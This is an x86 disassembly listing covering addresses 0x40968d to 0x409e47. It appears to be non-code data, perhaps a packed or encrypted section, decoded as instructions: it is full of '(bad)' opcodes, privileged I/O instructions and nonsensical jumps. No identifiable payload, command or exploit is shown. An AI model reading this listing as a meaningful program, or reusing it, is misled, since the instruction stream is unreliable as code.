  40968d:	and    edi,esi
  40968f:	jg     0x40968d
  409691:	adc    ch,ch
  409693:	and    dl,al
  409695:	fdivrp st(2),st
  409697:	jmp    0x409667
  409699:	mov    esi,0x6caebf3a
  40969e:	and    cl,bl
  4096a0:	scas   eax,DWORD PTR es:[edi]
  4096a1:	push   eax
  4096a2:	xor    al,0x6d
  4096a4:	cmp    eax,0xc93ca025
  4096a9:	mov    ds:0x2851dcfd,eax
  4096ae:	into   
  4096af:	and    bh,BYTE PTR ss:[esi+0x47]
  4096b3:	stos   DWORD PTR es:[edi],eax
  4096b4:	popa   
  4096b5:	push   ss
  4096b6:	lds    esi,FWORD PTR [edi-0xf9c8e6c]
  4096bc:	lahf   
  4096bd:	add    BYTE PTR [eax+eax*1+0x55],al
  4096c1:	scas   eax,DWORD PTR es:[edi]
  4096c2:	cdq    
  4096c3:	cs cli 
  4096c5:	inc    edx
  4096c6:	shr    DWORD PTR [edx+0x72278f4b],1
  4096cc:	cmp    DWORD PTR [eax+0x3376ea26],ebx
  4096d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096d3:	fsubr  DWORD PTR [edi+0x5d63483f]
  4096d9:	xor    eax,0xff19d7a5
  4096de:	retf   0xa5ff
  4096e1:	mov    ah,0xd0
  4096e3:	and    esi,eax
  4096e5:	test   BYTE PTR [ebx-0x3c88033f],ch
  4096eb:	push   eax
  4096ec:	xchg   ebp,eax
  4096ed:	cmp    DWORD PTR [ecx-0x5e],0xc2e539e3
  4096f4:	pop    edx
  4096f5:	loope  0x40970b
  4096f7:	inc    edi
  4096f8:	push   ebp
  4096f9:	sbb    DWORD PTR [edx],0x791f4cca
  4096ff:	jg     0x4096d1
  409701:	out    dx,eax
  409702:	xchg   edi,eax
  409703:	jne    0x4096a1
  409705:	mov    ds:0xb4e8ad8a,eax
  40970a:	std    
  40970b:	test   BYTE PTR [edx],dl
  40970d:	pop    ds
  40970e:	clc    
  40970f:	test   ebp,eax
  409711:	mov    dh,0xaf
  409713:	jbe    0x409771
  409715:	jle    0x4096c8
  409717:	fwait
  409718:	jl     0x4096ab
  40971a:	mov    ds:0xcd79cc58,al
  40971f:	fwait
  409720:	add    ch,dh
  409722:	aaa    
  409723:	ret    0x588d
  409726:	cld    
  409727:	add    ebp,0x1db2a4db
  40972d:	scas   eax,DWORD PTR es:[edi]
  40972e:	pop    ds
  40972f:	in     al,dx
  409730:	shl    BYTE PTR [edi],cl
  409732:	aam    0x4a
  409734:	mov    bl,0xbb
  409736:	mov    ds:0xd02756ac,eax
  40973b:	jbe    0x409763
  40973d:	xor    dh,BYTE PTR [eax-0x16495ba7]
  409743:	test   al,0x7c
  409745:	fldcw  WORD PTR [edi]
  409747:	stc    
  409748:	ja     0x409716
  40974a:	pop    ss
  40974b:	in     eax,0xf9
  40974d:	xchg   ch,al
  40974f:	sub    BYTE PTR [edi-0x3f0ef16],0x1f
  409756:	fld    TBYTE PTR [edx-0x7408d0c2]
  40975c:	sbb    DWORD PTR ds:0x2f15c9ad,edx
  409762:	imul   edi,DWORD PTR [edi+ecx*2+0x5f],0x928bfa73
  40976a:	inc    ecx
  40976b:	cmp    ebp,ebx
  40976d:	call   DWORD PTR [esi-0x29]
  409770:	mov    esi,0xc887ee04
  409775:	sbb    ch,BYTE PTR [ecx]
  409777:	(bad)  
  409778:	sub    BYTE PTR [edx-0x1bd9159b],bl
  40977e:	ins    DWORD PTR es:[edi],dx
  40977f:	inc    ebp
  409780:	mov    ebx,0x293a3456
  409785:	push   0xffffff89
  409787:	inc    ebp
  409788:	cld    
  409789:	cmp    DWORD PTR [ebp-0x4],0x0
  40978d:	lea    eax,[ebp+0x4]
  409790:	jmp    0x409c9b
  409795:	rcl    dh,1
  409797:	ror    ecx,cl
  409799:	ror    ecx,1
  40979b:	(bad)  
  40979c:	(bad)  
  40979e:	(bad)
  4097a2:	xor    DWORD PTR [ebx],edx
  4097a4:	in     eax,dx
  4097a5:	and    al,0xf8
  4097a7:	js     0x409821
  4097a9:	push   0x7c
  4097ab:	js     0x409825
  4097ad:	lahf   
  4097ae:	fimul  DWORD PTR [ecx]
  4097b0:	xchg   DWORD PTR ds:0xbd757d3,ebx
  4097b6:	std    
  4097b7:	and    DWORD PTR [esi],eax
  4097b9:	pop    esp
  4097ba:	cmovnp ecx,DWORD PTR [ebp-0x6fd6dec1]
  4097c1:	adc    cl,BYTE PTR [edx]
  4097c3:	outs   dx,DWORD PTR ds:[esi]
  4097c4:	cmp    cl,dh
  4097c6:	cmp    BYTE PTR [ecx-0x4],dl
  4097c9:	mov    esi,0x51a9b1e4
  4097ce:	inc    esp
  4097cf:	jl     0x4097dc
  4097d1:	dec    ebx
  4097d2:	adc    al,0xfe
  4097d4:	pop    eax
  4097d5:	jg     0x40978d
  4097d7:	jecxz  0x4097a7
  4097d9:	xchg   edi,eax
  4097da:	loope  0x409818
  4097dc:	ret    0xd17e
  4097df:	sub    eax,0x75627028
  4097e4:	cmp    DWORD PTR [edx+0x2d346dd9],ebp
  4097ea:	cmc    
  4097eb:	(bad)  
  4097ec:	mov    ecx,0x6e419fcd
  4097f1:	xor    ebp,DWORD PTR [ebx]
  4097f3:	gs inc ebx
  4097f5:	sub    eax,0x6b7dde00
  4097fa:	test   DWORD PTR [eax],ecx
  4097fc:	xor    ch,BYTE PTR [edx]
  4097fe:	adc    ch,BYTE PTR [ebp+ecx*8-0xd]
  409802:	outs   dx,DWORD PTR ds:[esi]
  409803:	outs   dx,DWORD PTR ds:[esi]
  409804:	ins    DWORD PTR es:[edi],dx
  409805:	pop    edi
  409806:	xchg   ebp,eax
  409807:	mov    edx,0xe5fc8209
  40980c:	mov    ch,0xe0
  40980e:	jbe    0x409848
  409810:	sbb    al,0xc5
  409812:	jnp    0x409820
  409814:	pop    esp
  409815:	sti    
  409816:	fiadd  DWORD PTR [edx]
  409818:	mov    al,0xc0
  40981a:	sbb    BYTE PTR [ebp+0x74fe1f7a],bh
  409820:	xchg   ecx,eax
  409821:	push   ebx
  409822:	inc    eax
  409823:	inc    edx
  409824:	xadd   DWORD PTR [eax],ebx
  409827:	out    dx,al
  409828:	push   ds
  409829:	dec    edx
  40982a:	outs   dx,DWORD PTR ds:[esi]
  40982b:	mov    eax,ds:0xdff49763
  409830:	std    
  409831:	mov    edi,0x96bf91f8
  409836:	pop    ecx
  409837:	pop    eax
  409838:	or     al,0x61
  40983a:	push   cs
  40983b:	push   0x3f2d7920
  409840:	stos   BYTE PTR es:[edi],al
  409841:	popa   
  409842:	test   esi,0x906c938d
  409848:	mov    ch,cl
  40984a:	scas   eax,DWORD PTR es:[edi]
  40984b:	push   edx
  40984c:	xor    DWORD PTR [ebx+edx*4+0x49a4910f],ebx
  409853:	jmp    DWORD PTR [edi]
  409855:	in     eax,0xb7
  409857:	mov    ds:0xaa3c7df6,eax
  40985c:	fisubr WORD PTR [edi-0x2f]
  40985f:	aad    0x85
  409861:	and    ebx,DWORD PTR [ecx]
  409863:	stos   DWORD PTR es:[edi],eax
  409864:	int3   
  409865:	std    
  409866:	or     ebp,ecx
  409868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409869:	pop    es
  40986a:	leave  
  40986b:	inc    ecx
  40986c:	mov    dh,0x9b
  40986e:	mov    esi,0x2534402a
  409873:	in     eax,0xbc
  409875:	fsubp  st(3),st
  409877:	mov    DWORD PTR [ebp-0x79d4138a],ecx
  40987d:	or     ebx,DWORD PTR [ecx+eax*8-0x2f9c4f13]
  409884:	mov    esp,0xa47808ae
  409889:	sar    BYTE PTR fs:[edi],cl
  40988c:	inc    edx
  40988d:	xchg   ebx,eax
  40988e:	idiv   BYTE PTR [edx+ebp*1+0x7014baac]
  409895:	sbb    BYTE PTR [ecx-0x73a7a5d1],ah
  40989b:	int3   
  40989c:	jo     0x409845
  40989e:	int    0x6b
  4098a0:	ins    BYTE PTR es:[di],dx
  4098a2:	jp     0x409867
  4098a4:	mov    ds:0x28e2acd3,eax
  4098a9:	cmp    eax,0xce0c3f41
  4098ae:	out    0xc2,eax
  4098b0:	push   ss
  4098b1:	sar    DWORD PTR [ebp-0x1109c3c1],cl
  4098b7:	aam    0xa7
  4098b9:	jmp    FWORD PTR [esi+0x7e]
  4098bc:	rcl    dh,cl
  4098be:	cdq    
  4098bf:	scas   eax,DWORD PTR es:[edi]
  4098c0:	test   al,0xc4
  4098c2:	or     eax,0x16b409ed
  4098c7:	loope  0x40986c
  4098c9:	add    bh,cl
  4098cb:	mov    dh,0xd0
  4098cd:	test   al,0x84
  4098cf:	push   edx
  4098d0:	dec    ebp
  4098d1:	jne    0x40992f
  4098d3:	shl    BYTE PTR [eax+0x414358fd],1
  4098d9:	sahf   
  4098da:	xchg   ebp,eax
  4098dc:	pop    ebx
  4098dd:	fld    TBYTE PTR [bx]
  4098e0:	push   esp
  4098e1:	repnz sar BYTE PTR [eax+0x58],0x2f
  4098e6:	push   esp
  4098e7:	sti    
  4098e8:	mov    dh,0x60
  4098ea:	int    0x82
  4098ec:	pop    eax
  4098ed:	mov    DWORD PTR [ecx+0x74],edx
  4098f0:	sub    BYTE PTR [edx-0x5c1dfa8c],ah
  4098f6:	mov    bh,0xf7
  4098f8:	sahf   
  4098f9:	rcl    esi,cl
  4098fb:	jne    0x4098b8
  4098fd:	(bad)  
  4098fe:	hlt    
  4098ff:	es mov edx,cs
  409902:	or     eax,0x61a23e47
  409907:	xchg   esi,esi
  409909:	push   ss
  40990a:	push   0xe6278bae
  40990f:	mov    edi,0xacf0404d
  409914:	pop    DWORD PTR [esi-0x5f1c70cb]
  40991a:	bound  ecx,QWORD PTR [esi-0x112f7336]
  409920:	test   DWORD PTR [ebp+ebx*1+0x61],edx
  409924:	fcomp  QWORD PTR [eax]
  409926:	xchg   ebx,eax
  409927:	repz in al,dx
  409929:	mov    esi,0x8bf54139
  40992e:	sub    eax,0xad5a429e
  409933:	sub    al,0xe0
  409935:	cmp    DWORD PTR [esi],edx
  409937:	add    al,BYTE PTR [ecx-0x643e80e5]
  40993d:	popf   
  40993e:	jne    0x409978
  409940:	repz cs mov al,0x14
  409944:	bound  esi,QWORD PTR [esi]
  409946:	adc    DWORD PTR [edx-0x15d2c652],0x192566d9
  409950:	jmp    0x9ea8:0xf4fd7977
  409957:	leave  
  409958:	push   eax
  409959:	call   0x28e1ed1e
  40995e:	xchg   ebx,eax
  40995f:	stos   BYTE PTR es:[edi],al
  409960:	and    BYTE PTR [esi],ah
  409962:	adc    edi,0xffffffd9
  409965:	pop    eax
  409966:	idiv   BYTE PTR [edi-0x29161b22]
  40996c:	cwde   
  40996d:	push   ecx
  40996e:	push   ecx
  40996f:	adc    DWORD PTR [esi],esi
  409971:	dec    esp
  409972:	sub    al,0x2c
  409974:	lods   eax,DWORD PTR ds:[esi]
  409975:	xchg   DWORD PTR [ebx+0x2d],ebp
  409978:	add    al,0x4e
  40997a:	xchg   esp,eax
  40997b:	enter  0xecac,0xa5
  40997f:	ror    BYTE PTR [ebp+0x125108b3],cl
  409985:	inc    edi
  409986:	jp     0x409919
  409988:	(bad)  
  409989:	(bad)  
  40998a:	popf   
  40998b:	dec    ebx
  40998c:	add    BYTE PTR [eax+ebp*4-0x12304baf],dh
  409993:	sub    eax,0x400df6a4
  409998:	retf   
  409999:	fwait
  40999a:	xchg   ebx,eax
  40999b:	jnp    0x4099d2
  40999d:	or     cl,BYTE PTR ds:0x2350633e
  4099a3:	jl     0x40995d
  4099a5:	outs   dx,DWORD PTR gs:[esi]
  4099a7:	sti    
  4099a8:	es data16 ins BYTE PTR es:[edi],dx
  4099ab:	mov    DWORD PTR [esi+0x74b17061],ebp
  4099b1:	call   0x365:0x331c2f2b
  4099b8:	popf   
  4099b9:	xor    edi,DWORD PTR [ebp-0x52f5955f]
  4099bf:	js     0x4099d6
  4099c1:	gs std 
  4099c3:	call   0xb1bd06e3
  4099c8:	pushf  
  4099c9:	rcl    BYTE PTR [ebp+0x2483bbd8],cl
  4099cf:	xchg   ah,dl
  4099d1:	das    
  4099d2:	dec    ebp
  4099d3:	out    0x5d,al
  4099d5:	ret    
  4099d6:	repz add ebp,DWORD PTR [ecx-0x24]
  4099da:	popf   
  4099db:	mov    al,ds:0xf227b8b6
  4099e0:	inc    ebx
  4099e1:	sub    al,0x34
  4099e3:	mov    gs,ecx
  4099e5:	and    BYTE PTR [esi+0x72],cl
  4099e8:	add    eax,0x8d6216d9
  4099ed:	sub    ch,bh
  4099ef:	enter  0xa46c,0x61
  4099f3:	cmp    eax,0x7548ef93
  4099f8:	sbb    esp,DWORD PTR [ecx+0x6d]
  4099fb:	fdivr  QWORD PTR [edx]
  4099fd:	add    eax,0xc6af1398
  409a02:	jnp    0x409a1f
  409a04:	push   edx
  409a05:	add    BYTE PTR [ebx-0x290511f9],0xc
  409a0c:	push   es
  409a0d:	mov    ds:0x893f78ae,eax
  409a12:	call   0x431d3c20
  409a17:	dec    ecx
  409a18:	retf   0x168e
  409a1b:	mov    edi,0x5e32fa7c
  409a20:	inc    ebp
  409a21:	leave  
  409a22:	scas   eax,DWORD PTR es:[edi]
  409a23:	xor    BYTE PTR [eax],cl
  409a25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a26:	inc    eax
  409a27:	or     BYTE PTR [ecx+0x33],dh
  409a2a:	call   DWORD PTR [edi-0x68]
  409a2d:	inc    edi
  409a2e:	jge    0x4099c1
  409a30:	jecxz  0x409a8b
  409a32:	stc    
  409a33:	xchg   esi,eax
  409a34:	pop    esi
  409a35:	fs mov eax,0x300cd01a
  409a3b:	mov    ebp,edx
  409a3d:	pop    ds
  409a3e:	loop   0x409a38
  409a40:	aad    0xcb
  409a42:	push   esp
  409a43:	mov    ah,0x9f
  409a45:	push   ebp
  409a46:	mov    BYTE PTR [edi-0xaf9a572],bl
  409a4c:	xchg   edx,eax
  409a4d:	mov    ch,0x3d
  409a4f:	mov    bl,BYTE PTR [ebp+0x513e761b]
  409a55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a56:	xchg   esp,eax
  409a57:	(bad)  
  409a58:	inc    DWORD PTR [edi-0x70cf6987]
  409a5e:	shl    BYTE PTR [edx],1
  409a60:	pop    ds
  409a61:	inc    edi
  409a62:	sti    
  409a63:	mov    edi,0x5b1e3e2e
  409a68:	test   DWORD PTR [esp+ecx*1+0xc],eax
  409a6c:	aaa    
  409a6d:	sbb    esi,DWORD PTR [edi]
  409a6f:	fs ret 
  409a71:	push   edi
  409a72:	xchg   edx,eax
  409a73:	pop    es
  409a74:	or     bh,bh
  409a76:	pop    ebx
  409a77:	stos   BYTE PTR es:[edi],al
  409a78:	sub    esi,DWORD PTR [edx+esi*4]
  409a7b:	xor    DWORD PTR [ecx+esi*8],edi
  409a7e:	push   eax
  409a7f:	(bad)  
  409a80:	aad    0xb9
  409a82:	dec    ebx
  409a83:	xor    al,0xed
  409a85:	(bad)  
  409a86:	fimul  WORD PTR [ecx+0x7a5a31a9]
  409a8c:	mov    al,0xc5
  409a8e:	ror    eax,0x2d
  409a91:	in     eax,0x1e
  409a93:	fdivr  DWORD PTR [ebx+0x9]
  409a96:	inc    edi
  409a97:	mov    eax,ds:0x893082ce
  409a9c:	fiadd  WORD PTR gs:[ebp-0x33]
  409aa0:	or     al,0x7f
  409aa2:	jmp    0x409b20
  409aa4:	pushf  
  409aa5:	and    bh,bh
  409aa7:	test   DWORD PTR ds:0xbedccfaa,eax
  409aad:	lahf   
  409aae:	mov    ebx,0x86e33978
  409ab3:	aad    0x5f
  409ab5:	mov    al,0xda
  409ab7:	adc    eax,0x43516748
  409abc:	mov    ecx,0xbcaebeaf
  409ac2:	inc    edx
  409ac3:	mov    BYTE PTR [edx],ch
  409ac5:	sub    al,0xd3
  409ac7:	out    dx,eax
  409ac8:	add    ch,BYTE PTR [edi+0x421199a7]
  409ace:	scas   al,BYTE PTR es:[edi]
  409acf:	call   0xc973:0x7b243d46
  409ad6:	cmp    DWORD PTR [esp+esi*1-0x1f01a248],ecx
  409add:	adc    eax,0xe3076d20
  409ae2:	cmp    DWORD PTR [ecx+0x138572d4],edi
  409ae8:	sbb    eax,0x25f43e99
  409aed:	test   al,0xc8
  409aef:	mov    edx,0xaf323345
  409af4:	adc    BYTE PTR [eax],cl
  409af6:	and    dh,BYTE PTR es:[ebp+0x4ff82d21]
  409afd:	mov    esi,0x4814c84a
  409b02:	push   esp
  409b03:	and    eax,0x15d9a894
  409b08:	fnstsw WORD PTR [edi]
  409b0a:	fwait
  409b0b:	les    ebx,FWORD PTR [ebx-0x16a09c7]
  409b11:	sub    DWORD PTR [edi+edi*1+0x39],ecx
  409b15:	loopne 0x409abd
  409b17:	or     DWORD PTR [ecx+0x6],0xa96a7c41
  409b1e:	pop    esi
  409b1f:	inc    eax
  409b20:	add    dh,al
  409b22:	(bad)  
  409b23:	popf   
  409b24:	jl     0x409b46
  409b26:	push   ebp
  409b27:	shl    DWORD PTR [edi+0x1a],cl
  409b2a:	jl     0x409ab1
  409b2c:	int3   
  409b2d:	mov    esp,0x4709a2bd
  409b32:	lods   eax,DWORD PTR ds:[esi]
  409b33:	mov    ebp,0xda0556aa
  409b38:	inc    ebp
  409b39:	jno    0x409b9a
  409b3b:	pop    ds
  409b3c:	iret   
  409b3d:	clc    
  409b3e:	sbb    bl,dl
  409b40:	rcl    DWORD PTR [bp+si-0x4845],1
  409b45:	dec    ebp
  409b46:	add    al,0x5a
  409b48:	cs dec esp
  409b4a:	or     ebx,DWORD PTR [edx-0x6d56e45d]
  409b50:	pop    esi
  409b51:	adc    al,0x48
  409b53:	dec    esp
  409b54:	push   ds
  409b55:	adc    BYTE PTR [edi],ch
  409b57:	aas    
  409b58:	mov    ah,0x1d
  409b5a:	fldenv [esi]
  409b5c:	mov    ebp,0x49ba14a1
  409b61:	jo     0x409b2a
  409b63:	gs push 0xc9af4cdd
  409b69:	or     cl,al
  409b6b:	in     al,dx
  409b6c:	mov    DWORD PTR [ebx],ecx
  409b6e:	sub    bh,BYTE PTR [ebp+ecx*4-0x6726a4e5]
  409b75:	neg    DWORD PTR [edx+0x29]
  409b78:	xchg   ebp,eax
  409b79:	test   BYTE PTR [edx],ah
  409b7b:	std    
  409b7c:	sbb    dl,BYTE PTR [edi]
  409b7e:	pop    edi
  409b7f:	inc    esp
  409b80:	xchg   DWORD PTR [edx+0x77f1bbef],edx
  409b86:	outs   dx,BYTE PTR ds:[esi]
  409b87:	arpl   WORD PTR [edx],ax
  409b89:	loop   0x409b1a
  409b8b:	xchg   edi,eax
  409b8c:	push   ecx
  409b8d:	les    esp,FWORD PTR [eax]
  409b8f:	stos   BYTE PTR es:[edi],al
  409b90:	test   al,0xa7
  409b92:	test   eax,0x58c37d81
  409b97:	and    esp,eax
  409b99:	pop    esi
  409b9a:	push   esi
  409b9b:	or     eax,0x3eae1cf8
  409ba0:	loope  0x409c17
  409ba2:	jb     0x409bbc
  409ba4:	rdtsc  
  409ba6:	jno    0x409b8a
  409ba8:	mov    edx,0x343f5efb
  409bad:	mov    dl,0x35
  409baf:	scas   eax,DWORD PTR es:[edi]
  409bb0:	clc    
  409bb1:	cwde   
  409bb2:	fdivrp st(4),st
  409bb4:	das    
  409bb5:	stos   BYTE PTR es:[edi],al
  409bb6:	(bad)  
  409bb7:	les    edx,FWORD PTR [esi+0x5db4553b]
  409bbd:	cwde   
  409bbe:	pop    ecx
  409bbf:	mov    esp,DWORD PTR [edx+0x66]
  409bc2:	cmc    
  409bc3:	in     al,0x6b
  409bc5:	(bad)  
  409bc6:	jecxz  0x409b6f
  409bc8:	pop    edx
  409bc9:	(bad)  
  409bcb:	fld    TBYTE PTR [ecx+0x2f]
  409bce:	pop    edx
  409bcf:	jmp    0x5e78b1b1
  409bd4:	mov    ebp,0xcb44dffe
  409bd9:	(bad)  
  409bda:	adc    al,0xa1
  409bdc:	loop   0x409c1a
  409bde:	jbe    0x409c44
  409be0:	xor    al,0xf8
  409be2:	or     al,0xb3
  409be4:	lock (bad) 
  409be6:	stos   DWORD PTR es:[edi],eax
  409be7:	push   eax
  409be8:	adc    dh,ch
  409bea:	test   al,0x22
  409bec:	outs   dx,DWORD PTR ds:[esi]
  409bed:	ds mov bh,0x7e
  409bf0:	pop    esi
  409bf1:	mov    DWORD PTR [esi],ecx
  409bf3:	fldenv ds:0x2869cbc9
  409bf9:	or     BYTE PTR [edx+eiz*8-0x75919191],dl
  409c00:	dec    ecx
  409c01:	sbb    al,0x9a
  409c03:	gs mov eax,0x962f8da8
  409c09:	mov    ah,0x39
  409c0b:	retf   
  409c0c:	mov    ds:0xcab05099,eax
  409c11:	jne    0x409c7b
  409c13:	test   DWORD PTR [eax+esi*4+0x2e],0x443f816
  409c1b:	mov    ch,0xf4
  409c1d:	iret   
  409c1e:	(bad)
  409c21:	inc    edx
  409c22:	push   ss
  409c23:	lods   eax,DWORD PTR ds:[esi]
  409c24:	push   ebp
  409c25:	jb     0x409c9b
  409c27:	pusha  
  409c28:	and    bl,BYTE PTR [ebx+0x6d]
  409c2b:	into   
  409c2c:	inc    ebp
  409c2d:	imul   eax,edi,0xcecee015
  409c33:	mov    bh,0x51
  409c35:	ds mov al,0x62
  409c38:	outs   dx,BYTE PTR ds:[esi]
  409c39:	add    BYTE PTR [eax],ah
  409c3b:	(bad)  
  409c3c:	push   DWORD PTR [eax]
  409c3e:	push   esp
  409c3f:	inc    edx
  409c40:	and    BYTE PTR [ecx+0x6c],bh
  409c43:	cmp    al,0x5b
  409c45:	outs   dx,BYTE PTR ds:[esi]
  409c46:	push   0xbbeb3aeb
  409c4b:	out    dx,al
  409c4c:	mov    bl,0x11
  409c4e:	mov    DWORD PTR [edx-0x7ff07a6e],ecx
  409c54:	(bad)  
  409c55:	test   DWORD PTR [ebx-0x5ee7996a],edi
  409c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c5c:	cmc    
  409c5d:	out    0xbe,eax
  409c5f:	std    
  409c60:	psubusw mm1,mm0
  409c63:	int    0x10
  409c65:	pop    es
  409c66:	gs sbb eax,0x4db1eb0d
  409c6c:	leave  
  409c6d:	pop    ebx
  409c6e:	int    0xa6
  409c70:	pop    esp
  409c71:	dec    edx
  409c72:	aam    0xe1
  409c74:	xlat   BYTE PTR ds:[ebx]
  409c75:	and    eax,0xb95f5e80
  409c7a:	in     eax,0x15
  409c7c:	dec    esp
  409c7d:	jne    0x409c69
  409c7f:	ret    
  409c80:	xchg   esi,eax
  409c81:	(bad)  
  409c83:	sbb    ecx,DWORD PTR [esp+eax*8+0x13b18b1e]
  409c8a:	pop    edx
  409c8b:	push   ecx
  409c8c:	sbb    eax,0x27ed4e5f
  409c91:	pop    es
  409c92:	in     eax,dx
  409c93:	fmul   QWORD PTR [esi]
  409c95:	cs sahf 
  409c97:	out    dx,eax
  409c98:	sbb    ebx,ebp
  409c9a:	pop    ds
  409c9b:	mov    DWORD PTR [ebp-0x38],eax
  409c9e:	jmp    0x40a1a9
  409ca3:	ret    
  409ca4:	ror    ch,1
  409ca6:	(bad)  
  409ca7:	fld    st(5)
  409ca9:	(bad)  
  409cab:	outs   dx,BYTE PTR ds:[esi]
  409cac:	js     0x409c6d
  409cae:	inc    esi
  409caf:	jge    0x409d26
  409cb1:	bound  esi,QWORD PTR [ecx]
  409cb3:	push   ss
  409cb4:	cmp    DWORD PTR [eax+0x78],0x6a
  409cb8:	jl     0x409d32
  409cba:	js     0x409c9c
  409cbc:	loopne 0x409c5f
  409cbe:	cmp    BYTE PTR [ecx-0x8],0xd4
  409cc2:	add    dl,ch
  409cc4:	aaa    
  409cc5:	mov    ch,0xf7
  409cc7:	scas   eax,DWORD PTR es:[edi]
  409cc8:	aam    0x30
  409cca:	mov    fs,WORD PTR [eax+ecx*1+0x7a76fb93]
  409cd1:	popf   
  409cd2:	xor    al,0xfc
  409cd4:	inc    ebx
  409cd5:	mov    al,ds:0xf973a334
  409cda:	pop    esi
  409cdb:	jmp    0xb10c:0xee16cc89
  409ce2:	inc    eax
  409ce3:	je     0x409cdf
  409ce5:	retf   
  409ce6:	dec    edi
  409ce7:	xor    eax,0xbf52c20c
  409cec:	cld    
  409ced:	sub    bl,BYTE PTR [edi-0x2a00282]
  409cf3:	sahf   
  409cf4:	pop    ebp
  409cf5:	loope  0x409d5a
  409cf7:	adc    eax,0x58f6e933
  409cfc:	mov    bl,0xa
  409cfe:	mov    ds:0xc1efda81,al
  409d03:	retf   0x3a01
  409d06:	cs clc 
  409d08:	adc    ch,0x66
  409d0b:	mov    ds:0x749752eb,eax
  409d10:	mov    al,0xd5
  409d12:	and    eax,0x72b44f9c
  409d17:	mov    bh,0x3f
  409d19:	or     ah,bl
  409d1b:	or     dh,BYTE PTR [ebp-0x42]
  409d1e:	push   0xffffffeb
  409d20:	push   es
  409d21:	push   ebp
  409d22:	cmp    BYTE PTR [ebx+0x6b72711d],ch
  409d28:	lock add DWORD PTR [ecx+0x38],esi
  409d2c:	jp     0x409cc8
  409d2e:	in     eax,0x13
  409d30:	sbb    al,0xf1
  409d32:	push   es
  409d33:	jae    0x409d8c
  409d35:	sbb    ah,bl
  409d37:	xchg   ecx,eax
  409d38:	test   DWORD PTR [esi-0x5d],ebx
  409d3b:	sub    BYTE PTR [ebp+0x47],bl
  409d3e:	cmp    DWORD PTR [edx+ebx*8+0x3006783b],ebp
  409d45:	xchg   DWORD PTR [esi+0x368a856a],eax
  409d4b:	mov    dh,0xbd
  409d4d:	(bad)  
  409d4e:	pmuludq mm6,mm0
  409d51:	int3   
  409d52:	mov    ebp,0x405e2fda
  409d57:	fisubr WORD PTR [eax]
  409d59:	fdivr  DWORD PTR [edi+eax*2-0xe]
  409d5d:	das    
  409d5e:	rol    BYTE PTR [esp+ebp*1],cl
  409d61:	mov    ebp,DWORD PTR [edx+0x9]
  409d64:	push   0x78
  409d66:	not    eax
  409d68:	pop    sp
  409d6a:	jg     0x409de9
  409d6c:	mov    edi,0xe130cd6
  409d71:	xchg   ebx,eax
  409d72:	dec    edi
  409d73:	pop    ecx
  409d74:	xor    eax,0x7deb7990
  409d79:	jmp    0x942c338b
  409d7e:	ins    DWORD PTR es:[edi],dx
  409d7f:	cmp    esp,DWORD PTR [edx-0x62]
  409d82:	inc    sp
  409d84:	or     edx,DWORD PTR [eax]
  409d86:	xlat   BYTE PTR ds:[ebx]
  409d87:	xlat   BYTE PTR ds:[ebx]
  409d88:	or     BYTE PTR [eax-0x3b],ch
  409d8b:	fstp   QWORD PTR [ecx]
  409d8d:	in     al,dx
  409d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d8f:	and    eax,edx
  409d91:	sbb    dl,BYTE PTR [edi-0x2d]
  409d94:	push   es
  409d95:	jne    0x409d5f
  409d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d98:	and    DWORD PTR [edi-0x21],ebp
  409d9b:	clc    
  409d9c:	into   
  409d9d:	or     eax,0x10b411d7
  409da2:	lods   eax,DWORD PTR ds:[esi]
  409da3:	cwde   
  409da4:	jo     0x409d82
  409da6:	adc    cl,BYTE PTR [eax+0x3]
  409da9:	push   es
  409daa:	cld    
  409dab:	mov    dh,0x90
  409dad:	jae    0x409def
  409daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409db0:	outs   dx,BYTE PTR ds:[esi]
  409db1:	and    bh,dh
  409db3:	xchg   esi,eax
  409db4:	add    eax,0x78e03518
  409db9:	sub    DWORD PTR [esi],0xfb8c4cb5
  409dbf:	push   cs
  409dc0:	outs   dx,BYTE PTR ds:[esi]
  409dc1:	mov    DWORD PTR [eax-0x3eb2b4bd],ecx
  409dc7:	popf   
  409dc8:	hlt    
  409dc9:	(bad)  
  409dca:	into   
  409dcb:	(bad)  
  409dcc:	sub    esp,DWORD PTR ds:0xba81cf9e
  409dd2:	adc    eax,0x6b51fb61
  409dd7:	dec    ebp
  409dd8:	mov    cs,WORD PTR [esi]
  409dda:	mov    ebx,0x204356e6
  409ddf:	mov    ss,WORD PTR [esi+0x12]
  409de2:	(bad)  
  409de3:	xchg   esp,eax
  409de4:	rcr    cl,cl
  409de6:	scas   al,BYTE PTR es:[edi]
  409de7:	pop    ebp
  409de8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409de9:	popa   
  409dea:	push   edi
  409deb:	mov    eax,0x6a36cf8d
  409df0:	ins    DWORD PTR es:[edi],dx
  409df1:	jecxz  0x409e66
  409df3:	in     eax,0x41
  409df5:	call   0xfe2e:0xf94be7be
  409dfc:	les    ebx,FWORD PTR gs:[esi-0x76]
  409e00:	test   ecx,edi
  409e02:	in     eax,0x4a
  409e04:	pop    esi
  409e05:	pushf  
  409e06:	aas    
  409e07:	sub    al,0xfa
  409e09:	xor    DWORD PTR [ecx-0x77],0x5eecd842
  409e10:	mov    ecx,0x9c1f9aec
  409e15:	lahf   
  409e16:	add    ecx,DWORD PTR [ecx+0x40]
  409e19:	xchg   esp,eax
  409e1a:	mov    edx,0xb8d5e58f
  409e1f:	adc    DWORD PTR [ecx-0x6dcdbc9a],edi
  409e25:	cli    
  409e26:	daa    
  409e27:	push   cs
  409e28:	push   ds
  409e29:	xchg   ecx,ebx
  409e2b:	test   DWORD PTR [ebp+ecx*4-0x13ca3db8],edi
  409e32:	scas   al,BYTE PTR es:[edi]
  409e33:	jne    0x409ea0
  409e35:	mov    al,0x5e
  409e37:	jmp    0xe5cfbf27
  409e3c:	add    BYTE PTR [ecx],ch
  409e3e:	pushf  
  409e3f:	dec    ecx
  409e40:	std    
  409e41:	rcr    BYTE PTR [eax],1
  409e43:	dec    ecx
  409e44:	and    cl,cl
  409e46:	(bad)  
  409e47:	fdiv   DWORD PTR ds:0xca6ceda
